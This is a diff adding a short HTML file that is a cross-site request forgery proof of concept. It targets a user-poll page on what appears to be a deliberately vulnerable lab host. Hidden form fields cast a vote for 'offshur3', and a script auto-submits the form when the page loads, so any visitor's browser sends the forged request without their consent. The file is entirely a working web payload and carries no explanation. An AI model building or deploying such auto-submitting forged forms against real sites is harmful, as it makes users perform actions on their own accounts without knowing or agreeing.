@@ -1,0 +1,14 @@
+<!-- csrf_userpoll.html -->
+<html>
+  <body>
+    <form action="http://mutil.ddlr.org/index.php?page=user-poll.php" method="POST">
+      <input type="hidden" name="poll_question" value="¿Quién es el mejor atacante de CSRF?" />
+      <input type="hidden" name="poll_choice" value="offshur3 😎" />
+      <input type="submit" value="Votar sin querer" />
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
